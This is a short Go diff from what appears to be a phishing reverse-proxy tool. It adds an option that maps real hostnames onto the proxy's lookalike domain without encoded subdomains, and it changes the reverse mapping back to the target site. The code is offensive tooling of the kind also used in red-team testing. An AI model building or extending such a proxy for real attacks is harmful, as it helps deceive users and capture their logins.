@@ -118,6 +118,11 @@ func RealURLtoPhish(realURL string) string {
 		}
 	}
 
+	if DisableDynamicSubdomains == true {
+		// TODO: DisableDynamicSubdomains doesn't support ForceHTTP and ForceHTTPS yet
+		return strings.Replace(out, host, ProxyDomain, 1)
+	}
+
 	if u.Scheme == "http" {
 		tls = false
 	} else if u.Scheme == "https" {
@@ -130,7 +135,6 @@ func RealURLtoPhish(realURL string) string {
 		encoded, _ := EncodeSubdomain(host, tls)
 		out = strings.Replace(out, host, encoded+"."+ProxyDomain, 1)
 	} else {
-
 		if strings.Contains(realURL, TopLevelDomain) { //subdomain in main domain
 			out = strings.Replace(out, string(TopLevelDomain), ProxyDomain, 1)
 		} else if realURL != "" {
@@ -176,13 +180,13 @@ func PhishURLToRealURL(phishURL string) string {
 		if len(subdomain) > 0 && host != ProxyDomain {
 			decodedDomain, _, _, err := DecodeSubdomain(subdomain)
 			if err != nil {
-				return strings.Replace(out, ProxyDomain, TopLevelDomain, 1)
+				return strings.Replace(out, ProxyDomain, Target, 1)
 			}
 
 			return string(decodedDomain)
 		}
 
-		return strings.Replace(out, ProxyDomain, TopLevelDomain, -1)
+		return strings.Replace(out, ProxyDomain, Target, -1)
 	}
 
 	return out
